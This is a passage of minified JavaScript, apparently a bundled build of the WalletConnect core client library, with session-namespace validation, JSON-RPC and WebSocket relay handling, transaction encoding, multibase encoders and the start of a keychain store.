        Approved: ${m.toString()}`))}),o.forEach(h=>{r||(jm(i[h].methods,s[h].methods)?jm(i[h].events,s[h].events)||(r=Xe("NON_CONFORMING_NAMESPACES",`${n} namespaces events don't satisfy namespace events for ${h}`)):r=Xe("NON_CONFORMING_NAMESPACES",`${n} namespaces methods don't satisfy namespace methods for ${h}`))}),r}function uTe(t){const e={};return Object.keys(t).forEach(n=>{var r;n.includes(":")?e[n]=t[n]:(r=t[n].chains)==null||r.forEach(i=>{e[i]={methods:t[n].methods,events:t[n].events}})}),e}function Dq(t){return[...new Set(t.map(e=>e.includes(":")?e.split(":")[0]:e))]}function lTe(t){const e={};return Object.keys(t).forEach(n=>{n.includes(":")?e[n]=t[n]:sw(t[n].accounts)?.forEach(i=>{e[i]={accounts:t[n].accounts.filter(s=>s.includes(`${i}:`)),methods:t[n].methods,events:t[n].events}})}),e}function dTe(t,e){return DB(t)&&t<=e.max&&t>=e.min}function Bq(){const t=X_();return new Promise(e=>{switch(t){case Za.browser:e(fTe());break;case Za.reactNative:e(hTe());break;case Za.node:e(pTe());break;default:e(!0)}})}function fTe(){return iw()&&navigator?.onLine}async function hTe(){return Gp()&&typeof global<"u"&&global!=null&&global.NetInfo?(await(global==null?void 0:global.NetInfo.fetch()))?.isConnected:!0}function pTe(){return!0}function mTe(t){switch(X_()){case Za.browser:gTe(t);break;case Za.reactNative:yTe(t);break}}function gTe(t){!Gp()&&iw()&&(window.addEventListener("online",()=>t(!0)),window.addEventListener("offline",()=>t(!1)))}function yTe(t){Gp()&&typeof global<"u"&&global!=null&&global.NetInfo&&global?.NetInfo.addEventListener(e=>t(e?.isConnected))}function bTe(){var t;return iw()&&Pf.getDocument()?((t=Pf.getDocument())==null?void 0:t.visibilityState)==="visible":!0}const x9={};class Iv{static get(e){return x9[e]}static set(e,n){x9[e]=n}static delete(e){delete x9[e]}}function wTe(t){const e=rw.decode(t);if(e.length<33)throw new Error("Too short to contain a public key");return e.slice(1,33)}function vTe({publicKey:t,signature:e,payload:n}){var r;const i=b7(n.method),s=128|parseInt(((r=n.version)==null?void 0:r.toString())||"4"),o=ATe(n.address),a=n.era==="00"?new Uint8Array([0]):b7(n.era);if(a.length!==1&&a.length!==2)throw new Error("Invalid era length");const c=parseInt(n.nonce,16),l=new Uint8Array([c&255,c>>8&255]),f=BigInt(`0x${_Te(n.tip)}`),h=STe(f),m=new Uint8Array([0,...t,o,...e,...a,...l,...h,...i]),b=CTe(m.length+1);return new Uint8Array([...b,s,...m])}function ETe(t){const e=b7(t),n=n6e.blake2b(e,void 0,32);return"0x"+Buffer.from(n).toString("hex")}function b7(t){return new Uint8Array(t.replace(/^0x/,"").match(/.{1,2}/g).map(e=>parseInt(e,16)))}function _Te(t){return t.startsWith("0x")?t.slice(2):t}function ATe(t){const e=rw.decode(t)[0];return e===42?0:e===60?2:1}function CTe(t){if(t<64)return new Uint8Array([t<<2]);if(t<16384){const e=t<<2|1;return new Uint8Array([e&255,e>>8&255])}else if(t<1<<30){const e=t<<2|2;return new Uint8Array([e&255,e>>8&255,e>>16&255,e>>24&255])}else throw new Error("Compact encoding > 2^30 not supported")}function STe(t){if(t<BigInt(1)<<BigInt(6))return new Uint8Array([Number(t<<BigInt(2))]);if(t<BigInt(1)<<BigInt(14)){const e=t<<BigInt(2)|BigInt(1);return new Uint8Array([Number(e&BigInt(255)),Number(e>>BigInt(8)&BigInt(255))])}else if(t<BigInt(1)<<BigInt(30)){const e=t<<BigInt(2)|BigInt(2);return new Uint8Array([Number(e&BigInt(255)),Number(e>>BigInt(8)&BigInt(255)),Number(e>>BigInt(16)&BigInt(255)),Number(e>>BigInt(24)&BigInt(255))])}else throw new Error("BigInt compact encoding not supported > 2^30")}function TTe(t){const e=Uint8Array.from(Buffer.from(t.signature,"hex")),n=wTe(t.transaction.address),r=vTe({publicKey:n,signature:e,payload:t.transaction}),i=Buffer.from(r).toString("hex");return ETe(i)}function BB({logger:t,name:e}){const n=typeof t=="string"?$I({opts:{level:t,name:e}}).logger:t;return n.level=typeof t=="string"?t:t.level,n}const xTe="PARSE_ERROR",ITe="INVALID_REQUEST",RTe="METHOD_NOT_FOUND",PTe="INVALID_PARAMS",Ooe="INTERNAL_ERROR",jB="SERVER_ERROR",NTe=[-32700,-32600,-32601,-32602,-32603],aE={[xTe]:{code:-32700,message:"Parse error"},[ITe]:{code:-32600,message:"Invalid Request"},[RTe]:{code:-32601,message:"Method not found"},[PTe]:{code:-32602,message:"Invalid params"},[Ooe]:{code:-32603,message:"Internal error"},[jB]:{code:-32e3,message:"Server error"}},koe=jB;function OTe(t){return NTe.includes(t)}function jq(t){return Object.keys(aE).includes(t)?aE[t]:aE[koe]}function kTe(t){const e=Object.values(aE).find(n=>n.code===t);return e||aE[koe]}function Doe(t,e,n){return t.message.includes("getaddrinfo ENOTFOUND")||t.message.includes("connect ECONNREFUSED")?new Error(`Unavailable ${n} RPC url at ${e}`):t}var I9={},Ud={},Mq;function DTe(){if(Mq)return Ud;Mq=1,Object.defineProperty(Ud,"__esModule",{value:!0}),Ud.isBrowserCryptoAvailable=Ud.getSubtleCrypto=Ud.getBrowerCrypto=void 0;function t(){return Nl?.crypto||Nl?.msCrypto||{}}Ud.getBrowerCrypto=t;function e(){const r=t();return r.subtle||r.webkitSubtle}Ud.getSubtleCrypto=e;function n(){return!!t()&&!!e()}return Ud.isBrowserCryptoAvailable=n,Ud}var Ld={},Uq;function BTe(){if(Uq)return Ld;Uq=1,Object.defineProperty(Ld,"__esModule",{value:!0}),Ld.isBrowser=Ld.isNode=Ld.isReactNative=void 0;function t(){return typeof document>"u"&&typeof navigator<"u"&&navigator.product==="ReactNative"}Ld.isReactNative=t;function e(){return typeof process<"u"&&typeof process.versions<"u"&&typeof process.versions.node<"u"}Ld.isNode=e;function n(){return!t()&&!e()}return Ld.isBrowser=n,Ld}var Lq;function jTe(){return Lq||(Lq=1,(function(t){Object.defineProperty(t,"__esModule",{value:!0});const e=G_;e.__exportStar(DTe(),t),e.__exportStar(BTe(),t)})(I9)),I9}var MTe=jTe();function Il(t=3){const e=Date.now()*Math.pow(10,t),n=Math.floor(Math.random()*Math.pow(10,t));return e+n}function mp(t=6){return BigInt(Il(t))}function Iu(t,e,n){return{id:n||Il(),jsonrpc:"2.0",method:t,params:e}}function d_(t,e){return{id:t,jsonrpc:"2.0",result:e}}function s8(t,e,n){return{id:t,jsonrpc:"2.0",error:UTe(e)}}function UTe(t,e){return typeof t>"u"?jq(Ooe):(typeof t=="string"&&(t=Object.assign(Object.assign({},jq(jB)),{message:t})),OTe(t.code)&&(t=kTe(t.code)),t)}let LTe=class{},FTe=class extends LTe{constructor(){super()}},$Te=class extends FTe{constructor(e){super()}};const HTe="^https?:",zTe="^wss?:";function qTe(t){const e=t.match(new RegExp(/^\w+:/,"gi"));if(!(!e||!e.length))return e[0]}function Boe(t,e){const n=qTe(t);return typeof n>"u"?!1:new RegExp(e).test(n)}function Fq(t){return Boe(t,HTe)}function $q(t){return Boe(t,zTe)}function VTe(t){return new RegExp("wss?://localhost(:d{2,5})?").test(t)}function joe(t){return typeof t=="object"&&"id"in t&&"jsonrpc"in t&&t.jsonrpc==="2.0"}function MB(t){return joe(t)&&"method"in t}function o8(t){return joe(t)&&(Rl(t)||Nc(t))}function Rl(t){return"result"in t}function Nc(t){return"error"in t}let UB=class extends $Te{constructor(e){super(e),this.events=new Wc.EventEmitter,this.hasRegisteredEventListeners=!1,this.connection=this.setConnection(e),this.connection.connected&&this.registerEventListeners()}async connect(e=this.connection){await this.open(e)}async disconnect(){await this.close()}on(e,n){this.events.on(e,n)}once(e,n){this.events.once(e,n)}off(e,n){this.events.off(e,n)}removeListener(e,n){this.events.removeListener(e,n)}async request(e,n){return this.requestStrict(Iu(e.method,e.params||[],e.id||mp().toString()),n)}async requestStrict(e,n){return new Promise(async(r,i)=>{if(!this.connection.connected)try{await this.open()}catch(s){i(s)}this.events.on(`${e.id}`,s=>{Nc(s)?i(s.error):r(s.result)});try{await this.connection.send(e,n)}catch(s){i(s)}})}setConnection(e=this.connection){return e}onPayload(e){this.events.emit("payload",e),o8(e)?this.events.emit(`${e.id}`,e):this.events.emit("message",{type:e.method,data:e.params})}onClose(e){e&&e.code===3e3&&this.events.emit("error",new Error(`WebSocket connection closed abnormally with code: ${e.code} ${e.reason?`(${e.reason})`:""}`)),this.events.emit("disconnect")}async open(e=this.connection){this.connection===e&&this.connection.connected||(this.connection.connected&&this.close(),typeof e=="string"&&(await this.connection.open(e),e=this.connection),this.connection=this.setConnection(e),await this.connection.open(),this.registerEventListeners(),this.events.emit("connect"))}async close(){await this.connection.close()}registerEventListeners(){this.hasRegisteredEventListeners||(this.connection.on("payload",e=>this.onPayload(e)),this.connection.on("close",e=>this.onClose(e)),this.connection.on("error",e=>this.events.emit("error",e)),this.connection.on("register_error",e=>this.onClose()),this.hasRegisteredEventListeners=!0)}};const WTe=()=>typeof WebSocket<"u"?WebSocket:typeof global<"u"&&typeof global.WebSocket<"u"?global.WebSocket:typeof window<"u"&&typeof window.WebSocket<"u"?window.WebSocket:typeof self<"u"&&typeof self.WebSocket<"u"?self.WebSocket:require("ws"),GTe=()=>typeof WebSocket<"u"||typeof global<"u"&&typeof global.WebSocket<"u"||typeof window<"u"&&typeof window.WebSocket<"u"||typeof self<"u"&&typeof self.WebSocket<"u",Hq=t=>t.split("?")[0],zq=10,KTe=WTe();let ZTe=class{constructor(e){if(this.url=e,this.events=new Wc.EventEmitter,this.registering=!1,!$q(e))throw new Error(`Provided URL is not compatible with WebSocket connection: ${e}`);this.url=e}get connected(){return typeof this.socket<"u"}get connecting(){return this.registering}on(e,n){this.events.on(e,n)}once(e,n){this.events.once(e,n)}off(e,n){this.events.off(e,n)}removeListener(e,n){this.events.removeListener(e,n)}async open(e=this.url){await this.register(e)}async close(){return new Promise((e,n)=>{if(typeof this.socket>"u"){n(new Error("Connection already closed"));return}this.socket.onclose=r=>{this.onClose(r),e()},this.socket.close()})}async send(e){typeof this.socket>"u"&&(this.socket=await this.register());try{this.socket.send(Rf(e))}catch(n){this.onError(e.id,n)}}register(e=this.url){if(!$q(e))throw new Error(`Provided URL is not compatible with WebSocket connection: ${e}`);if(this.registering){const n=this.events.getMaxListeners();return(this.events.listenerCount("register_error")>=n||this.events.listenerCount("open")>=n)&&this.events.setMaxListeners(n+1),new Promise((r,i)=>{this.events.once("register_error",s=>{this.resetMaxListeners(),i(s)}),this.events.once("open",()=>{if(this.resetMaxListeners(),typeof this.socket>"u")return i(new Error("WebSocket connection is missing or invalid"));r(this.socket)})})}return this.url=e,this.registering=!0,new Promise((n,r)=>{const i=MTe.isReactNative()?void 0:{rejectUnauthorized:!VTe(e)},s=new KTe(e,[],i);GTe()?s.onerror=o=>{const a=o;r(this.emitError(a.error))}:s.on("error",o=>{r(this.emitError(o))}),s.onopen=()=>{this.onOpen(s),n(s)}})}onOpen(e){e.onmessage=n=>this.onPayload(n),e.onclose=n=>this.onClose(n),this.socket=e,this.registering=!1,this.events.emit("open")}onClose(e){this.socket=void 0,this.registering=!1,this.events.emit("close",e)}onPayload(e){if(typeof e.data>"u")return;const n=typeof e.data=="string"?sg(e.data):e.data;this.events.emit("payload",n)}onError(e,n){const r=this.parseError(n),i=r.message||r.toString(),s=s8(e,i);this.events.emit("payload",s)}parseError(e,n=this.url){return Doe(e,Hq(n),"WS")}resetMaxListeners(){this.events.getMaxListeners()>zq&&this.events.setMaxListeners(zq)}emitError(e){const n=this.parseError(new Error(e?.message||`WebSocket connection failed for host: ${Hq(this.url)}`));return this.events.emit("register_error",n),n}};var YTe={};const Moe="wc",Uoe=2,w7="core",Yl=`${Moe}@2:${w7}:`,QTe={logger:"error"},JTe={database:":memory:"},XTe="crypto",qq="client_ed25519_seed",exe=Ye.ONE_DAY,txe="keychain",nxe="0.3",rxe="messages",ixe="0.3",sxe=Ye.SIX_HOURS,oxe="publisher",Loe="irn",axe="error",Foe="wss://relay.walletconnect.org",cxe="relayer",Ri={message:"relayer_message",message_ack:"relayer_message_ack",connect:"relayer_connect",disconnect:"relayer_disconnect",error:"relayer_error",connection_stalled:"relayer_connection_stalled",transport_closed:"relayer_transport_closed",publish:"relayer_publish"},uxe="_subscription",Ec={payload:"payload",connect:"connect",disconnect:"disconnect",error:"error"},lxe=.1,v7="2.23.0",Or={link_mode:"link_mode",relay:"relay"},GT={inbound:"inbound",outbound:"outbound"},dxe="0.3",fxe="WALLETCONNECT_CLIENT_ID",Vq="WALLETCONNECT_LINK_MODE_APPS",Fa={created:"subscription_created",deleted:"subscription_deleted",expired:"subscription_expired",disabled:"subscription_disabled",sync:"subscription_sync",resubscribed:"subscription_resubscribed"},hxe="subscription",pxe="0.3",mxe="pairing",gxe="0.3",Rv={wc_pairingDelete:{req:{ttl:Ye.ONE_DAY,prompt:!1,tag:1e3},res:{ttl:Ye.ONE_DAY,prompt:!1,tag:1001}},wc_pairingPing:{req:{ttl:Ye.THIRTY_SECONDS,prompt:!1,tag:1002},res:{ttl:Ye.THIRTY_SECONDS,prompt:!1,tag:1003}},unregistered_method:{req:{ttl:Ye.ONE_DAY,prompt:!1,tag:0},res:{ttl:Ye.ONE_DAY,prompt:!1,tag:0}}},xm={create:"pairing_create",expire:"pairing_expire",delete:"pairing_delete",ping:"pairing_ping"},fu={created:"history_created",updated:"history_updated",deleted:"history_deleted",sync:"history_sync"},yxe="history",bxe="0.3",wxe="expirer",Ic={created:"expirer_created",deleted:"expirer_deleted",expired:"expirer_expired",sync:"expirer_sync"},vxe="0.3",Exe="verify-api",_xe="https://verify.walletconnect.com",$oe="https://verify.walletconnect.org",cE=$oe,Axe=`${cE}/v3`,Cxe=[_xe,$oe],Sxe="echo",Txe="https://echo.walletconnect.com",xl={pairing_started:"pairing_started",pairing_uri_validation_success:"pairing_uri_validation_success",pairing_uri_not_expired:"pairing_uri_not_expired",store_new_pairing:"store_new_pairing",subscribing_pairing_topic:"subscribing_pairing_topic",subscribe_pairing_topic_success:"subscribe_pairing_topic_success",existing_pairing:"existing_pairing",pairing_not_expired:"pairing_not_expired",emit_inactive_pairing:"emit_inactive_pairing",emit_session_proposal:"emit_session_proposal",subscribing_to_pairing_topic:"subscribing_to_pairing_topic"},of={no_wss_connection:"no_wss_connection",no_internet_connection:"no_internet_connection",malformed_pairing_uri:"malformed_pairing_uri",active_pairing_already_exists:"active_pairing_already_exists",subscribe_pairing_topic_failure:"subscribe_pairing_topic_failure",pairing_expired:"pairing_expired",proposal_expired:"proposal_expired",proposal_listener_not_found:"proposal_listener_not_found"},hu={session_approve_started:"session_approve_started",proposal_not_expired:"proposal_not_expired",session_namespaces_validation_success:"session_namespaces_validation_success",create_session_topic:"create_session_topic",subscribing_session_topic:"subscribing_session_topic",subscribe_session_topic_success:"subscribe_session_topic_success",publishing_session_approve:"publishing_session_approve",session_approve_publish_success:"session_approve_publish_success",store_session:"store_session",publishing_session_settle:"publishing_session_settle",session_settle_publish_success:"session_settle_publish_success",session_request_response_started:"session_request_response_started",session_request_response_validation_success:"session_request_response_validation_success",session_request_response_publish_started:"session_request_response_publish_started"},K0={no_internet_connection:"no_internet_connection",no_wss_connection:"no_wss_connection",proposal_expired:"proposal_expired",subscribe_session_topic_failure:"subscribe_session_topic_failure",session_approve_publish_failure:"session_approve_publish_failure",session_settle_publish_failure:"session_settle_publish_failure",session_approve_namespace_validation_failure:"session_approve_namespace_validation_failure",proposal_not_found:"proposal_not_found",session_request_response_validation_failure:"session_request_response_validation_failure",session_request_response_publish_failure:"session_request_response_publish_failure"},Z0={authenticated_session_approve_started:"authenticated_session_approve_started",create_authenticated_session_topic:"create_authenticated_session_topic",cacaos_verified:"cacaos_verified",store_authenticated_session:"store_authenticated_session",subscribing_authenticated_session_topic:"subscribing_authenticated_session_topic",subscribe_authenticated_session_topic_success:"subscribe_authenticated_session_topic_success",publishing_authenticated_session_approve:"publishing_authenticated_session_approve"},Pv={no_internet_connection:"no_internet_connection",invalid_cacao:"invalid_cacao",subscribe_authenticated_session_topic_failure:"subscribe_authenticated_session_topic_failure",authenticated_session_approve_publish_failure:"authenticated_session_approve_publish_failure",authenticated_session_pending_request_not_found:"authenticated_session_pending_request_not_found"},xxe=.1,Ixe="event-client",Rxe=86400,Pxe="https://pulse.walletconnect.org/batch";function Nxe(t,e){if(t.length>=255)throw new TypeError("Alphabet too long");for(var n=new Uint8Array(256),r=0;r<n.length;r++)n[r]=255;for(var i=0;i<t.length;i++){var s=t.charAt(i),o=s.charCodeAt(0);if(n[o]!==255)throw new TypeError(s+" is ambiguous");n[o]=i}var a=t.length,c=t.charAt(0),l=Math.log(a)/Math.log(256),f=Math.log(256)/Math.log(a);function h(w){if(w instanceof Uint8Array||(ArrayBuffer.isView(w)?w=new Uint8Array(w.buffer,w.byteOffset,w.byteLength):Array.isArray(w)&&(w=Uint8Array.from(w))),!(w instanceof Uint8Array))throw new TypeError("Expected Uint8Array");if(w.length===0)return"";for(var y=0,E=0,A=0,R=w.length;A!==R&&w[A]===0;)A++,y++;for(var S=(R-A)*f+1>>>0,v=new Uint8Array(S);A!==R;){for(var k=w[A],O=0,_=S-1;(k!==0||O<E)&&_!==-1;_--,O++)k+=256*v[_]>>>0,v[_]=k%a>>>0,k=k/a>>>0;if(k!==0)throw new Error("Non-zero carry");E=O,A++}for(var I=S-E;I!==S&&v[I]===0;)I++;for(var T=c.repeat(y);I<S;++I)T+=t.charAt(v[I]);return T}function m(w){if(typeof w!="string")throw new TypeError("Expected String");if(w.length===0)return new Uint8Array;var y=0;if(w[y]!==" "){for(var E=0,A=0;w[y]===c;)E++,y++;for(var R=(w.length-y)*l+1>>>0,S=new Uint8Array(R);w[y];){var v=n[w.charCodeAt(y)];if(v===255)return;for(var k=0,O=R-1;(v!==0||k<A)&&O!==-1;O--,k++)v+=a*S[O]>>>0,S[O]=v%256>>>0,v=v/256>>>0;if(v!==0)throw new Error("Non-zero carry");A=k,y++}if(w[y]!==" "){for(var _=R-A;_!==R&&S[_]===0;)_++;for(var I=new Uint8Array(E+(R-_)),T=E;_!==R;)I[T++]=S[_++];return I}}}function b(w){var y=m(w);if(y)return y;throw new Error(`Non-${e} character`)}return{encode:h,decodeUnsafe:m,decode:b}}var Oxe=Nxe,kxe=Oxe;const Hoe=t=>{if(t instanceof Uint8Array&&t.constructor.name==="Uint8Array")return t;if(t instanceof ArrayBuffer)return new Uint8Array(t);if(ArrayBuffer.isView(t))return new Uint8Array(t.buffer,t.byteOffset,t.byteLength);throw new Error("Unknown type, must be binary type")},Dxe=t=>new TextEncoder().encode(t),Bxe=t=>new TextDecoder().decode(t);class jxe{constructor(e,n,r){this.name=e,this.prefix=n,this.baseEncode=r}encode(e){if(e instanceof Uint8Array)return`${this.prefix}${this.baseEncode(e)}`;throw Error("Unknown type, must be binary type")}}class Mxe{constructor(e,n,r){if(this.name=e,this.prefix=n,n.codePointAt(0)===void 0)throw new Error("Invalid prefix character");this.prefixCodePoint=n.codePointAt(0),this.baseDecode=r}decode(e){if(typeof e=="string"){if(e.codePointAt(0)!==this.prefixCodePoint)throw Error(`Unable to decode multibase string ${JSON.stringify(e)}, ${this.name} decoder only supports inputs prefixed with ${this.prefix}`);return this.baseDecode(e.slice(this.prefix.length))}else throw Error("Can only multibase decode strings")}or(e){return zoe(this,e)}}class Uxe{constructor(e){this.decoders=e}or(e){return zoe(this,e)}decode(e){const n=e[0],r=this.decoders[n];if(r)return r.decode(e);throw RangeError(`Unable to decode multibase string ${JSON.stringify(e)}, only inputs prefixed with ${Object.keys(this.decoders)} are supported`)}}const zoe=(t,e)=>new Uxe({...t.decoders||{[t.prefix]:t},...e.decoders||{[e.prefix]:e}});class Lxe{constructor(e,n,r,i){this.name=e,this.prefix=n,this.baseEncode=r,this.baseDecode=i,this.encoder=new jxe(e,n,r),this.decoder=new Mxe(e,n,i)}encode(e){return this.encoder.encode(e)}decode(e){return this.decoder.decode(e)}}const a8=({name:t,prefix:e,encode:n,decode:r})=>new Lxe(t,e,n,r),iA=({prefix:t,name:e,alphabet:n})=>{const{encode:r,decode:i}=kxe(n,e);return a8({prefix:t,name:e,encode:r,decode:s=>Hoe(i(s))})},Fxe=(t,e,n,r)=>{const i={};for(let f=0;f<e.length;++f)i[e[f]]=f;let s=t.length;for(;t[s-1]==="=";)--s;const o=new Uint8Array(s*n/8|0);let a=0,c=0,l=0;for(let f=0;f<s;++f){const h=i[t[f]];if(h===void 0)throw new SyntaxError(`Non-${r} character`);c=c<<n|h,a+=n,a>=8&&(a-=8,o[l++]=255&c>>a)}if(a>=n||255&c<<8-a)throw new SyntaxError("Unexpected end of data");return o},$xe=(t,e,n)=>{const r=e[e.length-1]==="=",i=(1<<n)-1;let s="",o=0,a=0;for(let c=0;c<t.length;++c)for(a=a<<8|t[c],o+=8;o>n;)o-=n,s+=e[i&a>>o];if(o&&(s+=e[i&a<<n-o]),r)for(;s.length*n&7;)s+="=";return s},Ps=({name:t,prefix:e,bitsPerChar:n,alphabet:r})=>a8({prefix:e,name:t,encode(i){return $xe(i,r,n)},decode(i){return Fxe(i,r,n,t)}}),Hxe=a8({prefix:"\0",name:"identity",encode:t=>Bxe(t),decode:t=>Dxe(t)});var zxe=Object.freeze({__proto__:null,identity:Hxe});const qxe=Ps({prefix:"0",name:"base2",alphabet:"01",bitsPerChar:1});var Vxe=Object.freeze({__proto__:null,base2:qxe});const Wxe=Ps({prefix:"7",name:"base8",alphabet:"01234567",bitsPerChar:3});var Gxe=Object.freeze({__proto__:null,base8:Wxe});const Kxe=iA({prefix:"9",name:"base10",alphabet:"0123456789"});var Zxe=Object.freeze({__proto__:null,base10:Kxe});const Yxe=Ps({prefix:"f",name:"base16",alphabet:"0123456789abcdef",bitsPerChar:4}),Qxe=Ps({prefix:"F",name:"base16upper",alphabet:"0123456789ABCDEF",bitsPerChar:4});var Jxe=Object.freeze({__proto__:null,base16:Yxe,base16upper:Qxe});const Xxe=Ps({prefix:"b",name:"base32",alphabet:"abcdefghijklmnopqrstuvwxyz234567",bitsPerChar:5}),eIe=Ps({prefix:"B",name:"base32upper",alphabet:"ABCDEFGHIJKLMNOPQRSTUVWXYZ234567",bitsPerChar:5}),tIe=Ps({prefix:"c",name:"base32pad",alphabet:"abcdefghijklmnopqrstuvwxyz234567=",bitsPerChar:5}),nIe=Ps({prefix:"C",name:"base32padupper",alphabet:"ABCDEFGHIJKLMNOPQRSTUVWXYZ234567=",bitsPerChar:5}),rIe=Ps({prefix:"v",name:"base32hex",alphabet:"0123456789abcdefghijklmnopqrstuv",bitsPerChar:5}),iIe=Ps({prefix:"V",name:"base32hexupper",alphabet:"0123456789ABCDEFGHIJKLMNOPQRSTUV",bitsPerChar:5}),sIe=Ps({prefix:"t",name:"base32hexpad",alphabet:"0123456789abcdefghijklmnopqrstuv=",bitsPerChar:5}),oIe=Ps({prefix:"T",name:"base32hexpadupper",alphabet:"0123456789ABCDEFGHIJKLMNOPQRSTUV=",bitsPerChar:5}),aIe=Ps({prefix:"h",name:"base32z",alphabet:"ybndrfg8ejkmcpqxot1uwisza345h769",bitsPerChar:5});var cIe=Object.freeze({__proto__:null,base32:Xxe,base32upper:eIe,base32pad:tIe,base32padupper:nIe,base32hex:rIe,base32hexupper:iIe,base32hexpad:sIe,base32hexpadupper:oIe,base32z:aIe});const uIe=iA({prefix:"k",name:"base36",alphabet:"0123456789abcdefghijklmnopqrstuvwxyz"}),lIe=iA({prefix:"K",name:"base36upper",alphabet:"0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZ"});var dIe=Object.freeze({__proto__:null,base36:uIe,base36upper:lIe});const fIe=iA({name:"base58btc",prefix:"z",alphabet:"123456789ABCDEFGHJKLMNPQRSTUVWXYZabcdefghijkmnopqrstuvwxyz"}),hIe=iA({name:"base58flickr",prefix:"Z",alphabet:"123456789abcdefghijkmnopqrstuvwxyzABCDEFGHJKLMNPQRSTUVWXYZ"});var pIe=Object.freeze({__proto__:null,base58btc:fIe,base58flickr:hIe});const mIe=Ps({prefix:"m",name:"base64",alphabet:"ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/",bitsPerChar:6}),gIe=Ps({prefix:"M",name:"base64pad",alphabet:"ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/=",bitsPerChar:6}),yIe=Ps({prefix:"u",name:"base64url",alphabet:"ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789-_",bitsPerChar:6}),bIe=Ps({prefix:"U",name:"base64urlpad",alphabet:"ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789-_=",bitsPerChar:6});var wIe=Object.freeze({__proto__:null,base64:mIe,base64pad:gIe,base64url:yIe,base64urlpad:bIe});const qoe=Array.from(""),vIe=qoe.reduce((t,e,n)=>(t[n]=e,t),[]),EIe=qoe.reduce((t,e,n)=>(t[e.codePointAt(0)]=n,t),[]);function _Ie(t){return t.reduce((e,n)=>(e+=vIe[n],e),"")}function AIe(t){const e=[];for(const n of t){const r=EIe[n.codePointAt(0)];if(r===void 0)throw new Error(`Non-base256emoji character: ${n}`);e.push(r)}return new Uint8Array(e)}const CIe=a8({prefix:"",name:"base256emoji",encode:_Ie,decode:AIe});var SIe=Object.freeze({__proto__:null,base256emoji:CIe}),TIe=Voe,Wq=128,xIe=-128,IIe=Math.pow(2,31);function Voe(t,e,n){e=e||[],n=n||0;for(var r=n;t>=IIe;)e[n++]=t&255|Wq,t/=128;for(;t&xIe;)e[n++]=t&255|Wq,t>>>=7;return e[n]=t|0,Voe.bytes=n-r+1,e}var RIe=E7,PIe=128,Gq=127;function E7(t,r){var n=0,r=r||0,i=0,s=r,o,a=t.length;do{if(s>=a)throw E7.bytes=0,new RangeError("Could not decode varint");o=t[s++],n+=i<28?(o&Gq)<<i:(o&Gq)*Math.pow(2,i),i+=7}while(o>=PIe);return E7.bytes=s-r,n}var NIe=Math.pow(2,7),OIe=Math.pow(2,14),kIe=Math.pow(2,21),DIe=Math.pow(2,28),BIe=Math.pow(2,35),jIe=Math.pow(2,42),MIe=Math.pow(2,49),UIe=Math.pow(2,56),LIe=Math.pow(2,63),FIe=function(t){return t<NIe?1:t<OIe?2:t<kIe?3:t<DIe?4:t<BIe?5:t<jIe?6:t<MIe?7:t<UIe?8:t<LIe?9:10},$Ie={encode:TIe,decode:RIe,encodingLength:FIe},Woe=$Ie;const Kq=(t,e,n=0)=>(Woe.encode(t,e,n),e),Zq=t=>Woe.encodingLength(t),_7=(t,e)=>{const n=e.byteLength,r=Zq(t),i=r+Zq(n),s=new Uint8Array(i+n);return Kq(t,s,0),Kq(n,s,r),s.set(e,i),new HIe(t,n,e,s)};let HIe=class{constructor(e,n,r,i){this.code=e,this.size=n,this.digest=r,this.bytes=i}};const Goe=({name:t,code:e,encode:n})=>new zIe(t,e,n);class zIe{constructor(e,n,r){this.name=e,this.code=n,this.encode=r}digest(e){if(e instanceof Uint8Array){const n=this.encode(e);return n instanceof Uint8Array?_7(this.code,n):n.then(r=>_7(this.code,r))}else throw Error("Unknown type, must be binary type")}}const Koe=t=>async e=>new Uint8Array(await crypto.subtle.digest(t,e)),qIe=Goe({name:"sha2-256",code:18,encode:Koe("SHA-256")}),VIe=Goe({name:"sha2-512",code:19,encode:Koe("SHA-512")});var WIe=Object.freeze({__proto__:null,sha256:qIe,sha512:VIe});const Zoe=0,GIe="identity",Yoe=Hoe,KIe=t=>_7(Zoe,Yoe(t)),ZIe={code:Zoe,name:GIe,encode:Yoe,digest:KIe};var YIe=Object.freeze({__proto__:null,identity:ZIe});new TextEncoder,new TextDecoder;const Yq={...zxe,...Vxe,...Gxe,...Zxe,...Jxe,...cIe,...dIe,...pIe,...wIe,...SIe};({...WIe,...YIe});function Qoe(t){return globalThis.Buffer!=null?new Uint8Array(t.buffer,t.byteOffset,t.byteLength):t}function QIe(t=0){return globalThis.Buffer!=null&&globalThis.Buffer.allocUnsafe!=null?Qoe(globalThis.Buffer.allocUnsafe(t)):new Uint8Array(t)}function Joe(t,e,n,r){return{name:t,prefix:e,encoder:{name:t,prefix:e,encode:n},decoder:{decode:r}}}const Qq=Joe("utf8","u",t=>"u"+new TextDecoder("utf8").decode(t),t=>new TextEncoder().encode(t.substring(1))),R9=Joe("ascii","a",t=>{let e="a";for(let n=0;n<t.length;n++)e+=String.fromCharCode(t[n]);return e},t=>{t=t.substring(1);const e=QIe(t.length);for(let n=0;n<t.length;n++)e[n]=t.charCodeAt(n);return e}),JIe={utf8:Qq,"utf-8":Qq,hex:Yq.base16,latin1:R9,ascii:R9,binary:R9,...Yq};function XIe(t,e="utf8"){const n=JIe[e];if(!n)throw new Error(`Unsupported encoding "${e}"`);return(e==="utf8"||e==="utf-8")&&globalThis.Buffer!=null&&globalThis.Buffer.from!=null?Qoe(globalThis.Buffer.from(t,"utf-8")):n.decoder.decode(`${n.prefix}${t}`)}var e8e=Object.defineProperty,t8e=(t,e,n)=>e in t?e8e(t,e,{enumerable:!0,configurable:!0,writable:!0,value:n}):t[e]=n,El=(t,e,n)=>t8e(t,typeof e!="symbol"?e+"":e,n);class n8e{constructor(e,n){this.core=e,this.logger=n,El(this,"keychain",new Map),El(this,"name",txe),El(this,"version",nxe),El(this,"initialized",!1),El(this,"storagePrefix",Yl),El(this,"init",async()=>{if(!this.initialized){const r=await this.getKeyChain();typeof r<"u"&&(this.keychain=r),this.initialized=!0}}),El(this,"has",r=>(this.isInitialized(),this.keychain.has(r))),El(this,"set",async(r,i)=>{this.isInitialized(),this.keychain.set(r,i),await this.persist()}),El(this,"get",r=>{this.isInitialized();const 